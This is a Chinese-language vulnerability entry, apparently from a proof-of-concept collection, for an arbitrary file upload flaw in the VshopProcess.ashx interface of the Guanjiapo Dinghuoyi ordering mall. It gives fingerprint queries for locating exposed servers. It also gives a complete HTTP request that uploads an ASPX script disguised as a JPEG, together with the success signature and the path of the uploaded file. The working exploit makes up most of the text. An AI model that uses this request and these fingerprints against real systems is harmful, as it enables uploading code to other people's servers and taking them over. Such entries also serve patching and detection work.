﻿# 管家婆订货易在线商城 VshopProcess 任意文件上传漏洞

> 更新时间：2024-03-08

> 漏洞编号：

> 漏洞说明：管家婆订货易，帮助传统企业构建专属的订货平台，PC+微信+APP+小程序+h5商城5网合一，无缝对接线下的管家婆ERP系统，让用户订货更高效。支持业务员代客下单，支持多级推客分销，以客带客，拓展渠道。让企业的生意更轻松。

管家婆订货易在线商城VshopProcess.ashx接口处存在任意文件上传漏洞，恶意攻击者可能利用此漏洞上传恶意文件最终导致服务器失陷。

> 漏洞特征：title="订货易"||title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"

> 验证脚本：HTTP

```
POST /API/VshopProcess.ashx?action=PostFileImg HTTP/1.1
Accept-Encoding: gzip
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5

------WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Disposition: form-data; name="fileup1i"; filename="dudesite.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %>
<% 
Response.Write("dudesite");
%>

------WebKitFormBoundarytCOFhbEjc3IfYaY5--
```

> 响应代码特征：200

> 响应内容特征：aspx

> 上传文件定位：/Storage/UserFileImg/xxx.aspx

> 验证文件来源：管家婆订货易在线商城 VshopProcess 任意文件上传漏洞.poc

